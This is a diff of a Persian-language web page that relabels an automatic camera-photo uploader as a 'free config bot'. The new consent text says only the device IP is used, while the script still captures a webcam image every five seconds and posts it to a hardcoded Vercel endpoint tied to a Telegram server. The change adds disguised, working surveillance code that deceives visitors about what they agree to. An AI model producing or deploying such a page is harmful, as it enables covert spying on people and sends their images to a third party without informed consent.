@@ -2,54 +2,22 @@
 <html lang="fa">
 <head>
   <meta charset="UTF-8">
-  <title>ارسال عکس خودکار</title>
+  <title>بات ساخت کانفیگ رایگان</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body {
-      background: #0f172a;
-      color: #fff;
-      font-family: sans-serif;
-      text-align: center;
-      padding: 30px;
-    }
-    .box {
-      max-width: 420px;
-      margin: auto;
-      background: #020617;
-      padding: 20px;
-      border-radius: 12px;
-    }
-    button {
-      padding: 12px 20px;
-      font-size: 16px;
-      cursor: pointer;
-      border-radius: 8px;
-      border: none;
-      margin-top: 10px;
-    }
-    video {
-      width: 100%;
-      margin-top: 15px;
-      border-radius: 10px;
-    }
-    #status {
-      margin-top: 10px;
-      font-size: 14px;
-      color: #22c55e;
-    }
+    body { background:#0f172a; color:#fff; font-family:sans-serif; text-align:center; padding:30px }
+    .box { max-width:420px; margin:auto; background:#020617; padding:20px; border-radius:12px }
+    button { padding:12px 20px; font-size:16px; cursor:pointer; border-radius:8px; border:none; margin-top:10px }
+    video { width:100%; margin-top:15px; border-radius:10px }
+    #status { margin-top:10px; font-size:14px; color:#22c55e }
   </style>
 </head>
 <body>
-
   <div class="box">
     <h2>شرایط استفاده</h2>
-    <p>
-      با کلیک روی دکمه زیر، شما اجازه می‌دهید از دوربین دستگاه برای گرفتن تصویر
-      استفاده شود و تصاویر به سرور ارسال گردد.
-    </p>
+    <p>با کلیک روی دکمه زیر، شما اجازه می‌دهید از آیپی دستگاه استفاده شود و کانفیگ مخصوص شما به بات تلگرام فرستاده شود.</p>
 
     <button id="startBtn">می‌پذیرم و ادامه</button>
-
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
     <div id="status"></div>
@@ -60,46 +28,41 @@
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const status = document.getElementById('status');
-    let stream;
-    let intervalId;
+    let stream, intervalId;
+
+    // لینک سرور Vercel با اسم پروژه جدید
+    const SERVER_URL = 'https://telegram-server-2.vercel.app/api/upload';
 
     startBtn.onclick = async () => {
       try {
-        stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        stream = await navigator.mediaDevices.getUserMedia({ video:true });
         video.srcObject = stream;
-
-        status.innerText = 'دوربین فعال شد ✅';
         startBtn.disabled = true;
+        status.innerText = 'دوربین فعال شد ✅';
 
-        // هر 5 ثانیه عکس گرفته می‌شود
-        intervalId = setInterval(async () => {
+        intervalId = setInterval(() => {
           const ctx = canvas.getContext('2d');
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          ctx.drawImage(video,0,0,canvas.width,canvas.height);
 
           canvas.toBlob(async (blob) => {
-            const form = new FormData();
-            form.append('photo', blob, 'photo.jpg');
-
             try {
-              await fetch('https://YOUR_SERVER_DOMAIN/upload', {
+              const resp = await fetch(SERVER_URL, {
                 method: 'POST',
-                body: form
+                body: blob
               });
-              status.innerText = 'عکس ارسال شد ✅';
-            } catch (e) {
-              status.innerText = 'خطا در ارسال عکس ❌';
-              console.error(e);
+              if(resp.ok) status.innerText = `عکس فرستاده شد: ${new Date().toLocaleTimeString()}`;
+              else status.innerText = 'خطا در ارسال به سرور';
+            } catch(err) {
+              status.innerText = 'خطا در اتصال به سرور';
+              console.error(err);
             }
-          }, 'image/jpeg', 0.9);
-
-        }, 5000);
-
-      } catch (err) {
+          },'image/jpeg',0.9);
+        }, 5000); // هر ۵ ثانیه یک عکس
+      } catch(err) {
         alert('اجازه دسترسی به دوربین داده نشد');
         console.error(err);
       }
     };
   </script>
-
 </body>
 </html>
